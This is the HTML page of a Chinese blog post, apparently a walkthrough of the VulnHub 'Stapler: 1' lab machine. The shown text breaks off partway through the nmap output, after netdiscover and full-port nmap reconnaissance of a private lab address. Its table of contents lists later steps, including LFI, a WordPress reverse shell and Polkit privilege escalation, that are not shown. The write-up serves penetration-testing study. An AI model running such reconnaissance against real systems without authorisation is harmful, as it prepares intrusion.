<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="VulnHub - Stapler: 1">
<meta property="og:url" content="https://z9m8r8.github.io/2024/12/13/Stapler%201/index.html">
<meta property="og:site_name" content="Phantom&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-12-12T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-13T12:46:30.871Z">
<meta property="article:author" content="Phantom">
<meta property="article:tag" content="Vulnhub">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="FTP">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="Insecure File Upload">
<meta property="article:tag" content="Crontab">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="MySQL">
<meta property="article:tag" content="Polkit">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/12/13/Stapler%201/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/12/13/Stapler%201/","path":"2024/12/13/Stapler 1/","title":"VulnHub - Stapler: 1"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>VulnHub - Stapler: 1 | Phantom's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Phantom's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 主机探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">3. FTP 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb-%E6%89%AB%E6%8F%8F"><span class="nav-text">4. SMB 扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3"><span class="nav-text">5. 666 端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">6. WEB 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#local-file-inclusion"><span class="nav-text">7. Local File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wordpress-%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">8. WordPress 反弹 Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">9. 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-text">9.1. 定时任务提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#polkit-%E6%8F%90%E6%9D%83cve-2021-4034"><span class="nav-text">9.2. Polkit 提权（CVE-2021-4034）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#password-%E6%8F%90%E6%9D%83"><span class="nav-text">9.3. Password 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">10. 补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">11. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Phantom"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Phantom</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">182</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/12/13/Stapler%201/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Phantom">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Phantom's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="VulnHub - Stapler: 1 | Phantom's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VulnHub - Stapler: 1
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-13 00:00:00 / 修改时间：20:46:30" itemprop="dateCreated datePublished" datetime="2024-12-13T00:00:00+08:00">2024-12-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>35 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler:
1 ~ VulnHub</a></p>
</blockquote>
<h2 id="主机探测">1. 主机探测</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.22</p>
<h2 id="端口扫描">2. 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.159.22  -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 02:29 EDT</span><br><span class="line">Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 87.50% <span class="keyword">done</span>; ETC: 02:32 (0:00:09 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.22</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65523 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp         vsftpd 2.0.8 or later</span><br><span class="line">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp    open   domain      dnsmasq 2.75</span><br><span class="line">80/tcp    open   http        PHP cli server 5.5 or later</span><br><span class="line">123/tcp   closed ntp</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">666/tcp   open   doom?</span><br><span class="line">3306/tcp  open   mysql?</span><br><span class="line">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port666-TCP:V=7.94SVN%I=7%D=10/18%Time=671200BE%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(NULL,2D58,<span class="string">&quot;PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\</span></span><br><span class="line"><span class="string">SF:0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x0</span></span><br><span class="line"><span class="string">SF:1\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A</span></span><br><span class="line"><span class="string">SF:@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\&quot;DL\[E\</span></span><br><span class="line"><span class="string">SF:xa2\x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x</span></span><br><span class="line"><span class="string">SF:0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\</span></span><br><span class="line"><span class="string">SF:xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x9</span></span><br><span class="line"><span class="string">SF:9\xd3\x08y&#125;\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf</span></span><br><span class="line"><span class="string">SF:8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce</span></span><br><span class="line"><span class="string">SF:\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x</span></span><br><span class="line"><span class="string">SF:8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\x</span></span><br><span class="line"><span class="string">SF:e0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe</span></span><br><span class="line"><span class="string">SF:4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf</span></span><br><span class="line"><span class="string">SF:1\xaf\xbd&amp;&amp;q\xf9\x97&#x27;i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\</span></span><br><span class="line"><span class="string">SF:xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f&#123;\xb9\xbc\xe5:i\xb2\x</span></span><br><span class="line"><span class="string">SF:1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\</span></span><br><span class="line"><span class="string">SF:xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c</span></span><br><span class="line"><span class="string">SF:\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x&#x27;\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\</span></span><br><span class="line"><span class="string">SF:xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\</span></span><br><span class="line"><span class="string">SF:xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd&#123;\xd2\xf6\xa6g\x1c8\x98u\(</span></span><br><span class="line"><span class="string">SF:\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?&#125;\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\</span></span><br><span class="line"><span class="string">SF:xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x</span></span><br><span class="line"><span class="string">SF:7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f</span></span><br><span class="line"><span class="string">SF:\x7f\xf9\xea\xb5m\x1c\xfc\xfef\&quot;\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\</span></span><br><span class="line"><span class="string">SF:xcb\[\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~&#123;\xb9\x9b\xf7\xda-\xac\]_\x</span></span><br><span class="line"><span class="string">SF:f9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8</span></span><br><span class="line"><span class="string">SF:f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe&#123;\x81\x1d\xfb\x1fE\xf6\x1f\</span></span><br><span class="line"><span class="string">SF:x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0b</span></span><br><span class="line"><span class="string">SF:I\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap</span></span><br><span class="line"><span class="string">SF:\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0&#x27;\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;</span></span><br><span class="line"><span class="string">SF:\xf4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\</span></span><br><span class="line"><span class="string">SF:xcd\x88\x8e&#125;\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xb</span></span><br><span class="line"><span class="string">SF:c\xbcL&#125;AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5</span></span><br><span class="line"><span class="string">SF:\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\</span></span><br><span class="line"><span class="string">SF:x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6G</span></span><br><span class="line"><span class="string">SF:TQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\</span></span><br><span class="line"><span class="string">SF:x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0&quot;</span>);</span><br><span class="line">MAC Address: 00:0C:29:7F:98:45 (VMware)</span><br><span class="line">Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 276.32 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.159.22  -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 02:37 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.22</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 65523 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.159.174</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can<span class="string">&#x27;t get directory listing: PASV failed: 550 Permission denied.</span></span><br><span class="line"><span class="string">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)</span></span><br><span class="line"><span class="string">|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)</span></span><br><span class="line"><span class="string">53/tcp    open   domain      dnsmasq 2.75</span></span><br><span class="line"><span class="string">| dns-nsid: </span></span><br><span class="line"><span class="string">|_  bind.version: dnsmasq-2.75</span></span><br><span class="line"><span class="string">80/tcp    open   http        PHP cli server 5.5 or later</span></span><br><span class="line"><span class="string">|_http-title: 404 Not Found</span></span><br><span class="line"><span class="string">123/tcp   closed ntp</span></span><br><span class="line"><span class="string">137/tcp   closed netbios-ns</span></span><br><span class="line"><span class="string">138/tcp   closed netbios-dgm</span></span><br><span class="line"><span class="string">139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">666/tcp   open   doom?</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   NULL: </span></span><br><span class="line"><span class="string">|     message2.jpgUT </span></span><br><span class="line"><span class="string">|     QWux</span></span><br><span class="line"><span 